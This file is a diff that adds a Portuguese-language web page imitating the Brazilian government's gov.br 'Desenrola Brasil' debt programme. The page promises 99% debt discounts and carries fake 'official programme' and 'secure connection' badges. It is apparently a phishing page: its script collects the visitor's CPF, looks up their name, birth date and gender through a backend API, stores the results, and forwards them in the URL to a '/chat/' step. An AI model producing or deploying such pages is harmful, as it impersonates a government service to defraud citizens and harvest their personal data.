@@ -1,0 +1,424 @@
+﻿<!DOCTYPE html><!-- Version: 2026-09-14T16:45:00Z --><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+   
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/png" sizes="96x96" href="images/icons8-brasil-windows-11-color-96.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="images/icons8-brasil-windows-11-color-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="images/icons8-brasil-windows-11-color-16.png">
+  <title>Desenrola Brasil — Informe seu CPF</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="../css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/desenrola.css">
+</head>
+<body>
+  <div class="page-wrap">
+    <header class="hdr hdr--cpf">
+      <a href="../index.html" class="hdr-logo-link" aria-label="gov.br">
+        <img src="images/iconegov.png" alt="" class="hdr-logo-img" width="100" height="32">
+      </a>
+      <div class="hdr-right hdr-right--icons-only">
+        <button type="button" class="hdr-icon-btn hdr-icon-btn--contrast" id="hdrContrast" aria-label="Alto contraste" title="Contraste">
+          <svg class="hdr-ico-split-contrast" width="22" height="22" viewbox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="12" r="9.25" fill="none" stroke="#1451B4" stroke-width="1.15"></circle>
+            <path fill="#1451B4" d="M12 2.75 A9.25 9.25 0 0 0 12 21.25 z"></path>
+            <path fill="#ffffff" d="M12 2.75 A9.25 9.25 0 0 1 12 21.25 z"></path>
+          </svg>
+        </button>
+        <span class="hdr-vsep" aria-hidden="true"></span>
+        <button type="button" class="hdr-icon-btn hdr-icon-btn--ear" aria-label="Acessibilidade auditiva" title="Acessibilidade">
+          <svg width="22" height="22" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M6 8.5 a6 6 0 0 1 12 0 v3 a3 3 0 0 0 3 3 v0 a3 3 0 0 1 -3 3 h-1"></path>
+            <path d="M18 11 v4 a4 4 0 0 1 -8 0 v-2"></path>
+          </svg>
+        </button>
+      </div>
+    </header>
+
+    <div class="crumb">
+      Benefício <span aria-hidden="true"> > </span> Desenrola Brasil
+      <span aria-hidden="true"> > </span> Usuário gov.br
+    </div>
+
+    <section class="card-main cpf-wrap">
+      <img class="limpe-logo" src="/cpf/images/limpa.png" alt="Limpe seu nome">
+
+      <p class="instrucao">
+        ✅ ATUALIZADO - Informe seu CPF e clique em "Continuar" para<br>
+        renegociar suas dívidas com descontos de 99%
+      </p>
+
+      <form id="cpfForm" novalidate="">
+        <div class="field-label">CPF</div>
+        <input class="input-cpf" type="tel" id="cpf" name="cpf" inputmode="numeric" autocomplete="off" placeholder="000.000.000-00" required="">
+
+        <button type="submit" class="btn-primary btn-cpf-submit" style="margin-top: 0">Continuar</button>
+      </form>
+
+      <div class="info-box">
+        <span class="ico-i" aria-hidden="true">!</span>
+        <p>
+          O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!
+        </p>
+      </div>
+
+      <div class="trust-badges">
+        <span class="trust-item">
+          <svg class="trust-ico" width="16" height="16" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <rect x="5" y="11" width="14" height="10" rx="2"></rect>
+            <path d="M8 11V7a4 4 0 0 1 8 0v4"></path>
+          </svg>
+          Conexão segura
+        </span>
+        <span class="trust-item">
+          <svg class="trust-ico" width="16" height="16" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            <path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"></path>
+          </svg>
+          Programa oficial
+        </span>
+      </div>
+      <p class="trust-sub">Sistema de Renegociação — Todos os direitos reservados</p>
+    </section>
+
+    <footer class="site-ft">
+      <div class="site-ft-inner">
+        <img src="images/iconefooter.png" alt="" class="ft-gov-img" width="120" height="40">
+        <div class="copy-block">
+          <p>Todo o conteúdo deste site está publicado sob a licença</p>
+          <strong>Sistema de Renegociação — Todos os direitos reservados</strong>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script src="js/header.js"></script>
+  <script>
+(function () {
+
+  function onlyDigits(s) {
+    return String(s || '').replace(/\D/g, '');
+  }
+
+  function formatCPF(v) {
+    var d = onlyDigits(v).slice(0, 11);
+
+    if (d.length <= 3) return d;
+
+    if (d.length <= 6) {
+      return d.slice(0, 3) + '.' + d.slice(3);
+    }
+
+    if (d.length <= 9) {
+      return d.slice(0, 3) + '.' +
+             d.slice(3, 6) + '.' +
+             d.slice(6);
+    }
+
+    return d.slice(0, 3) + '.' +
+           d.slice(3, 6) + '.' +
+           d.slice(6, 9) + '-' +
+           d.slice(9);
+  }
+
+  function isValidCPF(cpf) {
+
+    if (
+      cpf.length !== 11 ||
+      /^(\d)\1{10}$/.test(cpf)
+    ) {
+      return false;
+    }
+
+    var i;
+    var s = 0;
+    var r;
+
+    for (i = 1; i <= 9; i++) {
+      s += parseInt(cpf.charAt(i - 1), 10) * (11 - i);
+    }
+
+    r = (s * 10) % 11;
+
+    if (r === 10 || r === 11) {
+      r = 0;
+    }
+
+    if (r !== parseInt(cpf.charAt(9), 10)) {
+      return false;
+    }
+
+    s = 0;
+
+    for (i = 1; i <= 10; i++) {
+      s += parseInt(cpf.charAt(i - 1), 10) * (12 - i);
+    }
+
+    r = (s * 10) % 11;
+
+    if (r === 10 || r === 11) {
+      r = 0;
+    }
+
+    return r === parseInt(cpf.charAt(10), 10);
+  }
+
+  var input = document.getElementById('cpf');
+  var form = document.getElementById('cpfForm');
+
+  if (!input || !form) {
+    console.error('[CPF] Campo ou formulário não encontrado.');
+    return;
+  }
+
+  input.addEventListener('input', function () {
+    input.value = formatCPF(input.value);
+  });
+
+  form.addEventListener('submit', async function (e) {
+
+    e.preventDefault();
+
+    var raw = onlyDigits(input.value);
+
+    if (!isValidCPF(raw)) {
+      alert('CPF inválido. Verifique os dígitos.');
+      return;
+    }
+
+    var btn = form.querySelector('button[type="submit"]');
+
+    if (btn) {
+      btn.disabled = true;
+      btn.textContent = 'Consultando…';
+    }
+
+    try {
+
+      console.log('[CPF] Iniciando consulta');
+
+      /*
+       * Vercel Function
+       *
+       * Não usamos mais cpf-consulta.php.
+       */
+      var res = await fetch('/api/consulta', {
+        method: 'POST',
+
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+
+        body: JSON.stringify({
+          cpf: raw
+        }),
+
+        cache: 'no-store'
+      });
+
+      var json;
+
+      try {
+        json = await res.json();
+      } catch (parseError) {
+
+        console.error(
+          '[CPF] Resposta inválida:',
+          parseError
+        );
+
+        throw new Error(
+          'Resposta inválida do servidor.'
+        );
+      }
+
+      console.log(
+        '[CPF] Status:',
+        res.status
+      );
+
+      /*
+       * Erro retornado pela nossa Function
+       */
+      if (!res.ok || !json.success) {
+
+        console.error(
+          '[CPF] Erro:',
+          json.error
+        );
+
+        alert(
+          json.error ||
+          'Não foi possível consultar o CPF.'
+        );
+
+        return;
+      }
+
+      /*
+       * Estrutura da CPFHub:
+       *
+       * {
+       *   success: true,
+       *   data: {
+       *     name,
+       *     birthDate,
+       *     gender
+       *   }
+       * }
+       */
+      var d = json.data || {};
+
+      var nome = d.name || '';
+      var nasc = d.birthDate || '';
+      var genero = d.gender || '';
+
+      console.log(
+        '[CPF] Consulta realizada com sucesso'
+      );
+
+      if (
+        !nome ||
+        String(nome).trim() === ''
+      ) {
+
+        alert(
+          'Não foi possível validar o CPF. Tente novamente.'
+        );
+
+        return;
+      }
+
+      /*
+       * Salvar dados localmente
+       */
+      try {
+
+        localStorage.setItem(
+          'site.nome',
+          nome
+        );
+
+        localStorage.setItem(
+          'site.cpf',
+          raw
+        );
+
+        localStorage.setItem(
+          'site.nasc',
+          nasc
+        );
+
+        localStorage.setItem(
+          'site.genero',
+          genero
+        );
+
+      } catch (_) {
+
+        console.warn(
+          '[CPF] Não foi possível salvar no localStorage'
+        );
+      }
+
+      /*
+       * Tracking
+       */
+      var next = new URLSearchParams();
+
+      try {
+
+        var m =
+          window.gvdesenrolaMergeTracking &&
+          window.gvdesenrolaMergeTracking();
+
+        if (m) {
+
+          Object.keys(m).forEach(function (k) {
+
+            next.set(
+              k,
+              m[k]
+            );
+
+          });
+
+        }
+
+      } catch (e2) {
+
+        console.warn(
+          '[CPF] Erro no tracking:',
+          e2
+        );
+      }
+
+      /*
+       * Dados para o próximo passo
+       */
+      next.set(
+        'cpf',
+        raw
+      );
+
+      next.set(
+        'nome',
+        nome
+      );
+
+      if (nasc) {
+        next.set(
+          'nasc',
+          nasc
+        );
+      }
+
+      if (genero) {
+        next.set(
+          'genero',
+          genero
+        );
+      }
+
+
+      /*
+       * Redirecionamento
+       */
+      console.log(
+        '[CPF] Redirecionando para chat'
+      );
+
+      window.location.href =
+        '/chat/?' +
+        next.toString();
+
+    } catch (err) {
+
+      console.error(
+        '[CPF] Erro:',
+        err
+      );
+
+      alert(
+        'Erro de conexão. Tente novamente.'
+      );
+
+    } finally {
+
+      if (btn) {
+
+        btn.disabled = false;
+        btn.textContent = 'Continuar';
+
+      }
+
+    }
+
+  });
+
+})();
+</script>
+
+</body></html>
